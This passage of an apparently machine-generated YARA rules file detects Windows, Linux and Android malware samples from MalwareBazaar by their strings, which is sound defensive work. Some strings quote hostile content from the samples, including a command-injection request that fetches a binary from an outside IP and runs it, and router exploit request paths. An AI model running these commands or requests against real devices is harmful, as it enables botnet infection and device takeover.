        $s17 = "<httpClient>5__4"
        $s18 = "<upload>d__37"
        $s19 = "<ConnectAsync>d__7"
        $s20 = "<DisconnectAsync>d__8"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 82KB and
        all of them
}

rule Windows_d18cdc223e2b6248fc289f6f4aeefd0369c34539f1a9e80aabab33de725c38fd
{
    meta:
        description = "Auto ML: d18cdc223e2b6248fc289f6f4aeefd0369c34539f1a9e80aabab33de725c38fd"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 6344KB and
        all of them
}

rule Windows_d1cc9c3dfe7a71d641ead1f15911a697b5daa63a6a2ce7030a22d947d9847d91
{
    meta:
        description = "Auto ML: d1cc9c3dfe7a71d641ead1f15911a697b5daa63a6a2ce7030a22d947d9847d91"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "mscoree.dll"
        $s5 = "AsyncClient.exe"
        $s6 = "System"
        $s7 = "System.Security.Cryptography.X509Certificates"
        $s8 = "Socket"
        $s9 = "System.Net.Sockets"
        $s10 = "System.Net.Security"
        $s11 = "System.Threading"
        $s12 = "System.Drawing.Imaging"
        $s13 = "System.Text"
        $s14 = "Microsoft.Win32"
        $s15 = "System.Collections.Generic"
        $s16 = "System.Runtime.CompilerServices"
        $s17 = "System.Collections"
        $s18 = "System.IO"
        $s19 = "System.Diagnostics"
        $s20 = "System.Reflection"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 341KB and
        all of them
}

rule Android_d23704d50be8827883847a2c325e78d04d27ffc55a0dcdac9d469e841f1d27ed
{
    meta:
        description = "Auto ML: d23704d50be8827883847a2c325e78d04d27ffc55a0dcdac9d469e841f1d27ed"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "%1$d blocked user"
        $s2 = "%1$d blocked users"
        $s3 = "%1$d file"
        $s4 = "%1$d files"
        $s5 = "%1$d files saved to downloads"
        $s6 = "%1$d files saved to music"
        $s7 = "%1$d forwarded audio files"
        $s8 = "%1$d forwarded files"
        $s9 = "%1$d messages deleted"
        $s10 = "%1$d music file"
        $s11 = "%1$d music files"
        $s12 = "%1$d removed user"
        $s13 = "%1$d removed users"
        $s14 = "%1$d unread chat"
        $s15 = "%1$d unread chats"
        $s16 = "%1$d user"
        $s17 = "%1$d user requested to join"
        $s18 = "%1$d users"
        $s19 = "%1$d users requested to join"
        $s20 = "%1$s closed %2$s"
    condition:
        uint32(0) == 0x04034b50 and
        filesize < 72503KB and
        all of them
}

rule Windows_d244f5129dd0da39e8808311b3fd46120f5ddd4aa4b67be258f8ef42a3a6dafa
{
    meta:
        description = "Auto ML: d244f5129dd0da39e8808311b3fd46120f5ddd4aa4b67be258f8ef42a3a6dafa"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "@.reloc"
        $s6 = "system"
        $s7 = "LoadLibraryA"
        $s8 = "currcrack.dll"
        $s9 = "temp"
        $s10 = "C:\\Users\\Tim\\Desktop\\cracks\\crack-generator-master\\loader\\orbitloader\\x64\\Release\\orbitloader.pdb"
        $s11 = ".text$di"
        $s12 = ".text$mn"
        $s13 = ".text$mn$00"
        $s14 = ".text$x"
        $s15 = ".text$yd"
        $s16 = ".rdata"
        $s17 = ".rdata$T"
        $s18 = ".rdata$r"
        $s19 = ".rdata$voltmd"
        $s20 = ".rdata$zzzdbg"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 76KB and
        all of them
}

rule Windows_d2553d836a160bed1332940033420852ed6f03e3565ef623575b222506800056
{
    meta:
        description = "Auto ML: d2553d836a160bed1332940033420852ed6f03e3565ef623575b222506800056"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "6wINbl"
        $s6 = "setyBtxeN"
        $s7 = "setubirttAepyT"
        $s8 = "setubirttAretemaraP"
        $s9 = "setubirttAdohteM"
        $s10 = "ecapSetihWrOlluNsI"
        $s11 = "tluseR_teg"
        $s12 = "setuniMmorF"
        $s13 = "setyBteG"
        $s14 = "tluseRgolaiD"
        $s15 = "setyBllAetirW"
        $s16 = "maertSetalfeD"
        $s17 = "setyBelbaliavA"
        $s18 = "tluseRcnysAI"
        $s19 = "setubirttA.ylbmessAtramS"
        $s20 = "TOKEN_CURLY_OPEN"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1133KB and
        all of them
}

rule Windows_d25bc39ea826dd2e4d5e112cd47f124d0739ccd8dafd90fe05fe9d039a65d90d
{
    meta:
        description = "Auto ML: d25bc39ea826dd2e4d5e112cd47f124d0739ccd8dafd90fe05fe9d039a65d90d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "System.Runtime.CompilerServices"
        $s5 = "System"
        $s6 = "System.Diagnostics"
        $s7 = "System.Reflection"
        $s8 = "System.Runtime.InteropServices"
        $s9 = "AssemblyFileVersionAttribute"
        $s10 = "TargetFrameworkAttribute"
        $s11 = "System.Runtime.Versioning"
        $s12 = "System.Resources"
        $s13 = "AssemblyKeyFileAttribute"
        $s14 = "trademark_of_europe_and_the_union.exe"
        $s15 = "<Module>"
        $s16 = "ThreadSafeObjectProvider`1"
        $s17 = "MySettings"
        $s18 = "ApplicationSettingsBase"
        $s19 = "System.Configuration"
        $s20 = "MySettingsProperty"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 4581KB and
        all of them
}

rule Windows_d27bb75e762a2867a82e1a009c6791157e8430619965a54cfb0279a560476a7b
{
    meta:
        description = "Auto ML: d27bb75e762a2867a82e1a009c6791157e8430619965a54cfb0279a560476a7b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "`.reloc"
        $s5 = "@.rsrc"
        $s6 = "ShellExecuteExW"
        $s7 = "GetModuleFileNameW"
        $s8 = "ExitProcess"
        $s9 = "SHELL32.dll"
        $s10 = "USER32.dll"
        $s11 = "GetProcessWindowStation"
        $s12 = "SetThreadAffinityMask"
        $s13 = "GetProcAddress"
        $s14 = "GetLastError"
        $s15 = "RegSetValueExA"
        $s16 = ":pGET"
        $s17 = "LoadLibraryA"
        $s18 = "GetModuleHandleA"
        $s19 = "SetProcessAffinityMask"
        $s20 = "KERNEL32.dll"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5549KB and
        all of them
}

rule Linux_d2854fd43c283b3eb42d834af3eaf7aefd46353b17e23e368cb5aa47da6bcbd1
{
    meta:
        description = "Auto ML: d2854fd43c283b3eb42d834af3eaf7aefd46353b17e23e368cb5aa47da6bcbd1"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "/proc/%s/cmdline"
        $s7 = "/bin/systemd"
        $s8 = "/var/Challenget"
        $s9 = "[killer] Failed to create child process."
        $s10 = "deleted"
        $s11 = "payloadasdf"
        $s12 = "GET /%s HTTP/1.0"
        $s13 = "User-Agent: Update v1.0"
        $s14 = "GET /bin/zhttpd/${IFS}cd${IFS}/tmp;${IFS}rm${IFS}-rf${IFS}*;${IFS}wget${IFS}http://103.110.33.164/mips;${IFS}chmod${IFS}777${IFS}mips;${IFS}./mips${IFS}zyxel.selfrep;"
        $s15 = "No such file or directory"
        $s16 = "No such process"
        $s17 = "Interrupted system call"
        $s18 = "Bad file descriptor"
        $s19 = "No child processes"
        $s20 = "Resource temporarily unavailable"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 158KB and
        all of them
}

rule Windows_151d7008edac758ba7abc7236d3b5a0e4b5170f8b49fb4b1796acfa5118b5030
{
    meta:
        description = "Auto ML: 151d7008edac758ba7abc7236d3b5a0e4b5170f8b49fb4b1796acfa5118b5030"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".textbssW?"
        $s2 = ".text"
        $s3 = "`.rdata"
        $s4 = "@.data"
        $s5 = "@.rsrc"
        $s6 = "@.reloc"
        $s7 = "vtEmpty"
        $s8 = "fLoadable"
        $s9 = "PowerShellRunner"
        $s10 = "PowerShellRunner.PowerShellRunner"
        $s11 = "Unknown Filename"
        $s12 = "Unknown Module Name"
        $s13 = "RegOpenKeyExW"
        $s14 = "RegCloseKey"
        $s15 = "PDBOpenValidate5"
        $s16 = "delete"
        $s17 = "delete[]"
        $s18 = "`placement delete closure'"
        $s19 = "`placement delete[] closure'"
        $s20 = "`local static thread guard'"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 650KB and
        all of them
}

rule Windows_d2cf8156a14802cadeafc9cd7da63d7afec4648dee9b4ef17ed80cbb90da0d75
{
    meta:
        description = "Auto ML: d2cf8156a14802cadeafc9cd7da63d7afec4648dee9b4ef17ed80cbb90da0d75"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This file was created by ClamAV for internal use and should not be run."
        $s2 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s3 = ".text"
        $s4 = "`.rdata"
        $s5 = "@.data"
        $s6 = ".rsrc"
        $s7 = "ALT+3: Allow you to load ANY valid savegame (that respect the savegame structure)"
        $s8 = "Remember to save the loaded file to get a valid checksum."
        $s9 = "Any updates on http://gnagna2000.free.fr"
        $s10 = "http://forum.cheatengine.org/viewtopic.php?t=35439"
        $s11 = "CorExitProcess"
        $s12 = "mscoree.dll"
        $s13 = "- unable to open console device"
        $s14 = "- unexpected multithread lock error"
        $s15 = "- not enough space for thread data"
        $s16 = "- floating point not loaded"
        $s17 = "GAIsProcessorFeaturePresent"
        $s18 = "KERNEL32"
        $s19 = "GetProcessWindowStation"
        $s20 = "GetUserObjectInformationA"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 44KB and
        all of them
}

rule Linux_d2fe71782616a730d38e437ad76327a5cbdc821a02d8cf910499ef781312cbfa
{
    meta:
        description = "Auto ML: d2fe71782616a730d38e437ad76327a5cbdc821a02d8cf910499ef781312cbfa"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "WInhS"
        $s2 = "httpd8"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 41KB and
        all of them
}

rule Windows_d2ff8bef72f7424016a3e20986a20ba4b790de32a6dd300b9e96b59f969ff735
{
    meta:
        description = "Auto ML: d2ff8bef72f7424016a3e20986a20ba4b790de32a6dd300b9e96b59f969ff735"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "`local static thread guard'"
        $s16 = "`placement delete[] closure'"
        $s17 = "`placement delete closure'"
        $s18 = "delete[]"
        $s19 = "delete"
        $s20 = "GAIsProcessorFeaturePresent"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 339KB and
        all of them
}

rule Windows_d32f66a04d255dbb2bfc6133ab9d6f30909602081f232370b3dab56aa7b2809f
{
    meta:
        description = "Auto ML: d32f66a04d255dbb2bfc6133ab9d6f30909602081f232370b3dab56aa7b2809f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".reloc"
        $s5 = "delete"
        $s6 = "delete[]"
        $s7 = "`placement delete closure'"
        $s8 = "`placement delete[] closure'"
        $s9 = "`local static thread guard'"
        $s10 = "FlsGetValue"
        $s11 = "FlsSetValue"
        $s12 = "CorExitProcess"
        $s13 = "AreFileApisANSI"
        $s14 = "AppPolicyGetProcessTerminationMethod"
        $s15 = ".text$mn"
        $s16 = ".text$x"
        $s17 = ".rdata"
        $s18 = ".rdata$r"
        $s19 = ".rdata$sxdata"
        $s20 = ".rdata$voltmd"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 417KB and
        all of them
}

rule Windows_d34e493e8e0dfa5e9a04ded3565e2ed4d60473148e63aeb3fca9a7f62dc90900
{
    meta:
        description = "Auto ML: d34e493e8e0dfa5e9a04ded3565e2ed4d60473148e63aeb3fca9a7f62dc90900"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rsrc"
        $s3 = "@.reloc"
        $s4 = "lSystem.Resources.ResourceReader, mscorlib, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b77a5c561934e089#System.Resources.RuntimeResourceSet"
        $s5 = "hSystem.Drawing.Bitmap, System.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3aPADPADGy"
        $s6 = "QSystem.Drawing, Version=4.0.0.0, Culture=neutral, PublicKeyToken=b03f5f7f11d50a3a"
        $s7 = "System.Drawing.Bitmap"
        $s8 = "System.Windows.Forms"
        $s9 = "System"
        $s10 = "System.Drawing"
        $s11 = "System.Data"
        $s12 = "System.CodeDom.Compiler"
        $s13 = "System.Collections.Generic"
        $s14 = "System.ComponentModel"
        $s15 = "ApplicationSettingsBase"
        $s16 = "System.Configuration"
        $s17 = "SettingsBase"
        $s18 = "System.Data.Common"
        $s19 = "DbConnection"
        $s20 = "DbDataReader"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 558KB and
        all of them
}

rule Linux_d364cbdbfe2aeebf45a785f703255c05ec61d5f28e4ba255200f9ca9fea2f553
{
    meta:
        description = "Auto ML: d364cbdbfe2aeebf45a785f703255c05ec61d5f28e4ba255200f9ca9fea2f553"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "HTTP/1.1"
        $s2 = "User-Agent:"
        $s3 = "http"
        $s4 = "processor"
        $s5 = "/sys/devices/system/cpu"
        $s6 = ".text"
        $s7 = ".data"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 90KB and
        all of them
}

rule Linux_d3c1c6b9d6562722772c1d747067bec031bf3f8f04931fb1555afb6fc08ae35d
{
    meta:
        description = "Auto ML: d3c1c6b9d6562722772c1d747067bec031bf3f8f04931fb1555afb6fc08ae35d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "PROT_EXEC|PROT_WRITE failed."
        $s2 = "$Info: This file is packed with the UPX executable packer http://upx.sf.net $"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 28KB and
        all of them
}

rule Windows_d3e4f5863b1d06e57ee98bc50998d0addd25b93f86bb7f6aed8f7fa7d656b830
{
    meta:
        description = "Auto ML: d3e4f5863b1d06e57ee98bc50998d0addd25b93f86bb7f6aed8f7fa7d656b830"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = "@.rsrc"
        $s4 = "@.reloc"
        $s5 = "advapi32.dll"
        $s6 = "setupx.dll"
        $s7 = "setupapi.dll"
        $s8 = "advpack.dll"
        $s9 = "wininit.ini"
        $s10 = "Software\\Microsoft\\Windows\\CurrentVersion\\App Paths"
        $s11 = "HeapSetInformation"
        $s12 = "DecryptFileA"
        $s13 = "SHOWWINDOW"
        $s14 = "ADMQCMD"
        $s15 = "USRQCMD"
        $s16 = "LoadString() Error.  Could not load string resource."
        $s17 = "FILESIZES"
        $s18 = "UPDFILE%lu"
        $s19 = ".rdata$brc"
        $s20 = ".rdata"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 2284KB and
        all of them
}

rule Linux_d3fe49ea723f09224615fb2bf15654135d0b0dde01c8572ae59104cb0a0a32e8
{
    meta:
        description = "Auto ML: d3fe49ea723f09224615fb2bf15654135d0b0dde01c8572ae59104cb0a0a32e8"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "M-SEARCH * HTTP/1.1"
        $s2 = "USER-AGENT: Google Chrome/60.0.3112.90 Windows"
        $s3 = "Windows XP"
        $s4 = "HTTP/1.1 404 Not Found"
        $s5 = "HTTP/1.1 200 OK"
        $s6 = "POST /ctrlt/DeviceUpgrade_1 HTTP/1.1"
        $s7 = "Connection: keep-alive"
        $s8 = "/proc/%d/cmdline"
        $s9 = "busybox wget"
        $s10 = "/usr/lib/systemd/systemd"
        $s11 = "/usr/libexec/openssh/sftp-server"
        $s12 = "shell"
        $s13 = "httpd"
        $s14 = "system"
        $s15 = "wget-log"
        $s16 = "1337SoraLOADER"
        $s17 = "nloads"
        $s18 = "elfLoad"
        $s19 = "POST /goform/set_LimitClient_cfg HTTP/1.1"
        $s20 = "Cookie: user=admin"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 199KB and
        all of them
}

rule Windows_d406e47886a0c521ea3b3e2f9bb41261a8134e8145056da83ec3b74b329268bc
{
    meta:
        description = "Auto ML: d406e47886a0c521ea3b3e2f9bb41261a8134e8145056da83ec3b74b329268bc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "!This file was created by ClamAV for internal use and should not be run."
        $s2 = "ClamAV - A GPL virus scanner - http://www.clamav.net"
        $s3 = ".text"
        $s4 = ".rdata"
        $s5 = ".data"
        $s6 = ".rsrc"
        $s7 = "System"
        $s8 = "kernel32.dll"
        $s9 = "GetLongPathNameA"
        $s10 = "TThreadLocalCounter"
        $s11 = "$TMultiReadExclusiveWriteSynchronizer"
        $s12 = "GetDiskFreeSpaceExA"
        $s13 = "oleaut32.dll"
        $s14 = "VariantChangeTypeEx"
        $s15 = "EVariantArrayCreateError"
        $s16 = "EFileStreamError"
        $s17 = "EFCreateError"
        $s18 = "EFOpenError"
        $s19 = "EFilerErrorLmI"
        $s20 = "EReadError"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 1140KB and
        all of them
}

rule Windows_1520e4cb2748aa5725d8b6c242ff6cf365f6672db35df2745c920ed228666317
{
    meta:
        description = "Auto ML: 1520e4cb2748aa5725d8b6c242ff6cf365f6672db35df2745c920ed228666317"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "#HSEt"
        $s6 = "CorExitProcess"
        $s7 = "An application has made an attempt to load the C runtime library incorrectly."
        $s8 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s9 = "- Attempt to initialize the CRT more than once."
        $s10 = "- unable to open console device"
        $s11 = "- unexpected multithread lock error"
        $s12 = "- not enough space for thread data"
        $s13 = "- floating point support not loaded"
        $s14 = "FlsSetValue"
        $s15 = "FlsGetValue"
        $s16 = "`local static thread guard'"
        $s17 = "`placement delete[] closure'"
        $s18 = "`placement delete closure'"
        $s19 = "delete[]"
        $s20 = "delete"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 371KB and
        all of them
}

rule Windows_d47be58f4a767dcfe803a43a184158fdb7f0bbc379c4519e435540f9224c82dc
{
    meta:
        description = "Auto ML: d47be58f4a767dcfe803a43a184158fdb7f0bbc379c4519e435540f9224c82dc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = "@.rsrc"
        $s5 = "FlsSetValue"
        $s6 = "FlsGetValue"
        $s7 = "CorExitProcess"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 198KB and
        all of them
}

rule Windows_d4ccf1fa78f6a843f2f2eb3ade48c9b486247b497fa54e3c9dc28f7c5ec7088d
{
    meta:
        description = "Auto ML: d4ccf1fa78f6a843f2f2eb3ade48c9b486247b497fa54e3c9dc28f7c5ec7088d"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.rdata"
        $s3 = "@.data"
        $s4 = ".rsrc"
        $s5 = "CorExitProcess"
        $s6 = "FlsSetValue"
        $s7 = "FlsGetValue"
        $s8 = "An application has made an attempt to load the C runtime library incorrectly."
        $s9 = "- Attempt to use MSIL code from this assembly during native code initialization"
        $s10 = "- Attempt to initialize the CRT more than once."
        $s11 = "- unable to open console device"
        $s12 = "- unexpected multithread lock error"
        $s13 = "- not enough space for thread data"
        $s14 = "- floating point support not loaded"
        $s15 = "SystemFunction036"
        $s16 = "ADVAPI32.DLL"
        $s17 = "GetProcessWindowStation"
        $s18 = "GetUserObjectInformationA"
        $s19 = "GetLastActivePopup"
        $s20 = "GetActiveWindow"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 277KB and
        all of them
}

rule Windows_d4eea21584acd9311afc40a1d565e173f60740339993f24118238ed8fb45f1cc
{
    meta:
        description = "Auto ML: d4eea21584acd9311afc40a1d565e173f60740339993f24118238ed8fb45f1cc"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "This program must be run under Win32"
        $s2 = ".rdata"
        $s3 = "P.reloc"
        $s4 = "P.rsrc"
        $s5 = "NewInstance"
        $s6 = "TEMP"
        $s7 = "USERPROFILE"
        $s8 = "GetUserDefaultUILanguage"
        $s9 = "kernel32.dll"
        $s10 = "TFile"
        $s11 = "EFileError"
        $s12 = "File I/O error %d"
        $s13 = "TCompressedBlockReader"
        $s14 = "TSetupLanguageEntry@"
        $s15 = "The setup files are corrupted. Please obtain a new copy of the program."
        $s16 = "shell32.dll"
        $s17 = "InnoSetupLdrWindow"
        $s18 = "Inno Setup Setup Data (5.1.2)"
        $s19 = "Inno Setup Messages (5.1.0)"
        $s20 = "DeleteCriticalSection"
    condition:
        uint32(0) == 0x00505a4d and
        filesize < 4008KB and
        all of them
}

rule Windows_d4f7142b56e0f4f2134a9d446390397d7aa79691b947e76475b776f0ae97e861
{
    meta:
        description = "Auto ML: d4f7142b56e0f4f2134a9d446390397d7aa79691b947e76475b776f0ae97e861"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".rsrc"
        $s2 = "pdateRemoteUserInfo"
        $s3 = "Close"
        $s4 = "WindowSiz"
        $s5 = "GetView`x"
        $s6 = "function SetA"
        $s7 = "if(System.scanFiles("
        $s8 = "function SetHost"
        $s9 = "{recordset:flatL L"
        $s10 = "// }include \"../tis/global_module/load_tis.tis\";"
        $s11 = "include \"../tis/global_module/lo"
        $s12 = "// ShowUpdateTempPassTip"
        $s13 = "ShowCloseToast("
        $s14 = "<html window-frame=\"transparent\""
        $s15 = "<meta http-equiv=\"Cont <"
        $s16 = "; charset=utf-8\" /`G"
        $s17 = ": Widget;}@+"
        $s18 = "SetAppDir(p"
        $s19 = "f(System\""
        $s20 = "anFiles`Z"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 15834KB and
        all of them
}

rule Linux_d534080dad4a1f1415a769e5552d61bd55841e20095dc9c9125d9fc5bdbacc4b
{
    meta:
        description = "Auto ML: d534080dad4a1f1415a769e5552d61bd55841e20095dc9c9125d9fc5bdbacc4b"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = "Mozilla/5.0 (Windows NT 6.1; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
        $s2 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/70.0.3538.102 Safari/537.36"
        $s3 = "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/66.0.3359.117 Safari/537.36"
        $s4 = "DPATCH /%s HTTP/1.1"
        $s5 = "User-Agent: %s"
        $s6 = "Connection: close"
        $s7 = "OpenSuse"
        $s8 = "OpenWRT"
        $s9 = "No such file or directory"
        $s10 = "No such process"
        $s11 = "Interrupted system call"
        $s12 = "Bad file descriptor"
        $s13 = "No child processes"
        $s14 = "Resource temporarily unavailable"
        $s15 = "File exists"
        $s16 = "Too many open files in system"
        $s17 = "Too many open files"
        $s18 = "Text file busy"
        $s19 = "File too large"
        $s20 = "Read-only file system"
    condition:
        uint32(0) == 0x464c457f and
        filesize < 80KB and
        all of them
}

rule Windows_d567003d0b60a1045031fed0d9d6f66c59e7ceb95fc0f6ec7fd518b19976958f
{
    meta:
        description = "Auto ML: d567003d0b60a1045031fed0d9d6f66c59e7ceb95fc0f6ec7fd518b19976958f"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "Install, Setup or Update"
        $s6 = "This sets the present colors as default. When you restart, these will be the colors that appear."
        $s7 = "This resets the default colors. When you restart, these will be the colors that appear."
        $s8 = "This sets the size as the default. Use it to create shapes of the same size."
        $s9 = "MSComDlg.CommonDialog"
        $s10 = "Toggle Display Window"
        $s11 = "ConnectingLine"
        $s12 = "mnuFile"
        $s13 = "&File"
        $s14 = "mnuOpen"
        $s15 = "&Open..."
        $s16 = "ReadyState"
        $s17 = "Shdocvw.dll"
        $s18 = "OWC11.Spreadsheet"
        $s19 = "Spreadsheet"
        $s20 = "WindowEditor"
    condition:
        uint32(0) == 0x00905a4d and
        filesize < 5252KB and
        all of them
}

rule Windows_d5695c153934c4417ae3584e476f5196ffe69e413a9df40ec0e55589f4803d54
{
    meta:
        description = "Auto ML: d5695c153934c4417ae3584e476f5196ffe69e413a9df40ec0e55589f4803d54"
        reference = "datalake.abuse.ch/malware-bazaar/daily"
        techniques = "T1587.001"
        capec = "542"
        cwe = ""
        cve = ""
    strings:
        $s1 = ".text"
        $s2 = "`.data"
        $s3 = ".rsrc"
        $s4 = "MSVBVM60.DLL"
        $s5 = "Module1"
        $s6 = "Module2"
        $s7 = "C:\\Program Files (x86)\\Microsoft Visual Studio\\VB98\\VB6.OLB"
        $s8 = ".myhttp"
        $s9 = "+.C:\\Windows\\system32\\winhttpcom.dll"
